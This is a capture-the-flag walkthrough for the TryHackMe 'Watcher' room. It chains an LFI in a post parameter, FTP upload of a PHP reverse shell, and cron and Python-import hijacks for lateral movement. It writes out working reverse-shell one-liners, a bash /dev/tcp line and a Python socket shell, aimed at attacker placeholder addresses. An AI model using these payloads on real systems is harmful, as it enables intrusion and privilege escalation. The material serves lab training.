---
title: Watcher Writeup || Tryhackme
date: 2025-9-22 00:00:00 +0800
categories: [Tryhackme]
tags: [tryhackme, writeup, walkthrough, web, scripts, crontab, lfi, ftp]     # TAG names should always be lowercase
description: This is a walkthrough for Watcher room We will go through getting ftp credentials from a file on the website by abusing an lfi vulnerability, .
---

### Scanning

Let's Start with scanning our target

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:04:2e:c3:e0:b1:5a:0b:72:95:e9:07:7f:0c:df:21 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDempzcxQTfRmz3o+QoU0jic0LtTAeBgU/jM+7boPFyMOmihDjCVH1+lcF0at3qvA0Rstl9CnHVVekrtjiD7vPwwto6wbDn/s+ubloJ2so+jyRAT0jXWBuMWe45vX3dZ8TPJ4pWlGUxpU6whPKcwliShMi76e4srTmY8qyWNRTF8ocK5wbBOrd9dkE+RvukaEeRk0GZAUeOoebzq2Qtp+OoPVDWhcloS5tmrnHzu2vzYfXTmxHfZodjeKNgVIqptExtJFc2uDvh60fdbCvJxnlA9mGPKPYibjvsoc99sCI0fUZdXCDqEAVSM1pUP5tS+ZSFoaExibqBbwDYnRLanvZy4WM1A1obCiY2jlww1UqIEb5LwUJx83MRz1TraRrMuaqjsZqJv1sI/o+4pwt+MxSPkMLGwTeHJfr1rZV3ZMpFpShy/57duwtawp/vOHRpTZ6RtwAOO9DSDTXOdEBbHxInc4Di9rhsQz4fF0mmgG+KxzKCjN/iuo2RssQ31iJNskE=
|   256 39:b8:26:7e:1f:57:6d:e8:f3:e9:66:b6:02:4d:32:d6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGjWV1nQPM67uaqSuBwJqj2jQ2BtUz8S1cPmNWgdImAj1CVX4wWGwLd0cCHKPzXjgA+EVUDQhQdjsIldtzhyDNA=
|   256 70:e2:9e:cd:15:cb:12:64:56:86:87:68:94:da:f7:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII7TgMYyv+iPcFGU3ueDolE5bwK0VB5LqqykAMmC/QgD
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Corkplacemats
```

We have 3 ports open two of them are interesting the ftp and the http one but the anonymous login on the ftp server is not allowed so let's start with exploring our http one first.

### Enumerating Website

We will see that it is a website for fans and lovers of cork-based placemats. I will start be seeing the robots.txt file and see what we will find. 

![img-description](/assets/img/Watcher/robots.png)
_Robots.txt_

There are 2 Paths right there the first one is our first flag and the other one i do not have access to it, and i think it will contain some useful information so we need to see it's content.

![img-description](/assets/img/Watcher/Paths.png)
_Paths_


#### LFI Discovery

When i was going through the website published posts i thought that the url of the posts is a bit suspicious and it is probably will lead to LFI, but how is that?

```
http://10.10.176.76/post.php?post=striped.php
```

The application is probably including or reading a file whose name comes directly from the post query parameter without validating or sanitizing it. That will let us change post to point to any file the webserver can read and what do you think we need to read?

exactly the file that we have seen earlier in the robots.txt file, and as we know the file is probably on the same directory where the posts is which is /var/www/html so we won't need to chage anything, just replace the file called striped.php and put in the file that we need to see which is **secret_file_do_not_read.txt**

![img-description](/assets/img/Watcher/ftpCreds.png)
_Ftp Credentials_

and we will see that it worked we can even see other files that are on the system beyond the files that are in the webserver directory but this is not our goal right now so let's see what we will find on the ftp server now.

### Gaining Access

The file contains a note which is talking about a path to a directory where the files are saved and also we have now the ftp credentials so let's login with it and see what we will find 

![img-description](/assets/img/Watcher/FtpContent.png)
_Ftp Contents_

it contains the second flag which you can see through using the **get** command followed by the file name, we will also notice that there is dir called files which is probably the dir that the one who wrote the note was talking about **/home/ftpuser/ftp/files**.

So in order to get access to the system we will put a [Reverse Shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) in the ftp and then execute it through the webserver using the LFI vuln we have discovered.

Now go to the files directory in the ftp and make sure you have opened the ftp connection while you are in the directory that contains the reverse shell you have downloaded. **"Do not Forget to change your ip and port in the reverse shell before uploading"**

```
ftp> put php_reverse_shell.php
local: php_reverse_shell.php remote: php_reverse_shell.php
229 Entering Extended Passive Mode (|||42671|)
150 Ok to send data.
100% |****************************************************************************************************|  9407      109.44 KiB/s    00:00 ETA
226 Transfer complete.
9407 bytes sent in 00:03 (3.00 KiB/s)
```

Now open a reverse shell with the port you have typed in the file.

```
nc -nlvp 4444
```

Go to the webserver and in the url change the striped.php file again but with our reverse shell file path which is "/home/ftpuser/ftp/files/php_reverse_shell.php".

```
http://10.10.176.76/post.php?post=/home/ftpuser/ftp/files/php_reverse_shell.php
```

and we are in.

![img-description](/assets/img/Watcher/access.png)
_Gaining Access_

Now stabilize the shell using this command and let's start enumerating

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
when listing the files in the web directory you will find another directory that may contains another secret, and yes it contains the third flag

![img-description](/assets/img/Watcher/ThirdFlag.png)
_Third Flag_

### Lateral Movement

Starting with seeing the sudo rights that we have on the system we will find that we may run any command as the user toby without needing any password so we will go to this user home directory and we will find the fourth flag so we will read it through specifying the user toby when using the sudo command.

![img-description](/assets/img/Watcher/FourthFlag.png)
_Fourth Flag_

Now there is an interesting file called note.txt so let's see it's content

![img-description](/assets/img/Watcher/Cron.png)
_Crontab_

the user mat is talking about setting a **cronjob(a cronjob is Scheduled execution for a file by the user who have created it)** that he has set up for the user toby, and yes we will see that there is a cronjob executing by the user mat, upon seeing the file content we will see it is a simple bash command for copying an image from one directory to another one.

When seeing this file permissions we can see that this file is owned by the user toby and remember we can execute sudo commands as the user toby so we can edit the file with no problems.

```
echo '/bin/sh -i >& /dev/tcp/Your-IP/Port-Number 0>&1' | sudo -u toby tee -a /home/toby/jobs/cow.sh >/dev/null
```

Use this command to add the reverse shell to the file change the ip and port with yours and in another window open a listener with the port you have typed and wait for the cronjob to be executed.

![img-description](/assets/img/Watcher/matAccess.png)
_getting shell as mat_

and we will see that we have now a shell as the user mat, let's complete our lateral movement process.

Now going to the user mat home directory we will find the fifth flag and another note let's read it.

![img-description](/assets/img/Watcher/anotherNote.png)
_Second Note_

will is saying that he have set some sudo rights on a script to run as him so let's see our sudo rights.

```
mat@ip-10-10-25-10:~$ sudo -l
Matching Defaults entries for mat on ip-10-10-25-10:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on ip-10-10-25-10:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

let's see this script

![img-description](/assets/img/Watcher/Scripts.png)
_Scripts_

we will see that they are two scripts the will_script.py which we can not edit is importing from the file called cmd.py so we may abuse that to gain another reverse shell but this time with the user will.

instead of editing on the commmands and we can not do this because it is whitelisting them so we will remove everything from the cmd.py and replace it with the reverse shell command so that when it import the file it will execute the reverse shell in it and we will gain access to the user mat

So use this command to add the reverse shell inside the file

```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('your-ip',port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" > cmd.py
```

and now open a listener with the port you have typed in the command and execute the script with any parameter and wait for the connection

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```

We can now see our sixth flag

![img-description](/assets/img/Watcher/will.png)
_Will Flag_


### Root Access

Now we must go for the root, i have tried many things and searched a lot of files but didn't find anything but when i was seeing the directories in the root directory i have found a directoory called backups in the /opt directory and when seeing the content we will find that it is a base64 key

![img-description](/assets/img/Watcher/key.png)
_Key_

I have decoded it and it is an ssh key so take it and put it in a file and do not forget to change permissions of the file and then use this command to login via ssh i will try to login with the root username and see what will happen

```
┌──(kali㉿kali)-[/tmp]
└─$ chmod 700 id_rsa   
                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa root@10.10.25.10
```

and we are in and now we can see our last flag.

![img-description](/assets/img/Watcher/root.png)
_Last Flag_

Thanks for reading and i hope that i have helped.